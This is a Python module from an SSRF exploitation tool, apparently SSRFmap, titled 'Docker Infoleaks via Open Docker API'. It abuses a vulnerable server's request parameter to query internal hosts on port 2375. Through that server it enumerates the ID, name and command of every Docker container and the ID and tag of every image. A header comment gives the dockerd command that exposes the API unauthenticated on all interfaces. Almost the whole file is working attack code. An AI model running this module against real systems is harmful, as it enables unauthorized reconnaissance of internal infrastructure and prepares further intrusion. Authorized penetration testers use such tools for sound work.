from core.utils import *
import logging
import json
import urllib.parse

# NOTE
# Enable Remote API with the following command
# /usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock

name          = "docker"
description   = "Docker Infoleaks via Open Docker API"
author        = "Swissky"
documentation = []

class exploit():

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))
        gen_host = gen_ip_list("127.0.0.1", args.level)
        port = "2375"

        for ip in gen_host:
            
            # Step 1 - Extract id and name from each container
            data = "containers/json"
            payload = wrapper_http(data, ip, port)
            r = requester.do_request(args.param, payload)

            if r.json:
                for container in r.json():
                    container_id      = container['Id']
                    container_name    = container['Names'][0].replace('/','')
                    container_command = container['Command']

                    logging.info("Found docker container")
                    logging.info("\033[32mId\033[0m : {}".format(container_id))
                    logging.info("\033[32mName\033[0m : {}".format(container_name))
                    logging.info("\033[32mCommand\033[0m : {}\n".format(container_command))

            # Step 2 - Extract id and name from each image 
            data = "images/json"
            payload = wrapper_http(data, ip, port)
            r = requester.do_request(args.param, payload)

            if r.json:
                images = {}
                for index, container in enumerate(r.json()):
                    container_id      = container['Id']
                    container_name    = container['RepoTags'][0].replace('/','')

                    logging.info("Found docker image n°{}".format(index))
                    logging.info("\033[32mId\033[0m : {}".format(container_id))
                    logging.info("\033[32mName\033[0m : {}\n".format(container_name))
                    images[container_name] = container_id